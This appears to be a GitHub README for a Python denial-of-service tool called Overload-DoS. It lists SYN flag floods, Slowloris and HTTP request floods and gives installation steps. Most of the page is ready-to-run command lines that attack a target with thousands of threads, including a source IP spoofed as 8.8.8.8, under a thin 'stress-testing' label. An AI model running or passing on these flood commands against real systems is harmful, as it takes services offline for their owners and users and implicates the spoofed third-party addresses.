# Overload-DoS

This a very powerful denial of service (DDoS) program. It is very efficient and portable, it is stable and useful for stress-testing companies, it currently has three attack methods. 1) SYN/ICMP with 6 flags including fin, syn, rst, ack, psh and urg. 2) Slowloris/SLOW uses sock.connect to attack. 3) Request/Requester uses httplib to attack. You either choose one of the three attack methods or you can choose all three!   
## Getting Started

You will need a few different modules installed to execute Overload.

### Modules

You will have to use pip to install the modules, colorama, termcolor & requests
```
sudo apt-get install python-pip
```
```
sudo yum install python-pip
```
### Module Installing

Using pip you can install the following modules

```
sudo pip install colorama termcolor requests
```


## Install Overload-Dos

```
git clone https://github.com/codingplanets/Overload-DoS
```
```
cd Overload-DoS
```
```
chmod +x *
```
```
./install-overload
```
## Usages
```
usage: ./Overload-DoS.py -target [target] -port [port] -threads [number threads]

optional arguments:
  -h, --help           show this help message and exit

options:

  -target <ip/domain>  Specify your target
  -timeout <timeout>   Timeout for socket
  -threads <threads>   Set threads number for connection (default = 1000)
  -port <port>         Specify port target (default = 80)
  -sleep <sleep time>  Set sleep time for reconnection
  -spoof <spoofed ip>  Specify spoofed IP address
  -request             Enable request target
  -syn                 Enable syn attack
  -slow                Enable slow attack
  -fakeip              Option to create fake ip if not specifed for spoofed ip
```
## Examples
Slowloris/SLOW attack method
```
./Overload-DoS.py -target www.target.com -port 80 -threads 2000 -slow
```
Request/Requester attack method
```
./Overload-DoS.py -target www.target.com -port 80 -threads 2000 -request
```
SYN/6 flagged ICMP attack method
```
./Overload-DoS.py -target www.target.com -syn -threads 5000
```
SLOW/Request/SYN attack method
```
./Overload-DoS.py -target www.target.com -port 80 -threads 2000 -request -slow -syn
```
SLOW/Request/SYN spoofed IP attack method
```
./Overload-DoS.py -target www.target.com -port 80 -threads 2000 -request -slow -syn -spoof 8.8.8.8
```

## Built With

* [Python 2.7](https://www.python.org/download/releases/2.7/) - The code framework used
* [Requests](http://docs.python-requests.org/en/master/) - Used to send DoS attack
* [Colorama](https://pypi.python.org/pypi/colorama) - Used to generate text color
* [Termcolor](https://pypi.python.org/pypi/termcolor) - Used to generate text color



## Authors

* **Chris Poole**  -  Twitter: [@codingplanets](https://twitter.com/codingplanets)  -  Github: [/codingplanets](https://github.com/codingplanets)  -  Pastebin: [/1337ings](https://pastebin.com/u/1337ings)


## License

This project is licensed under the MIT License

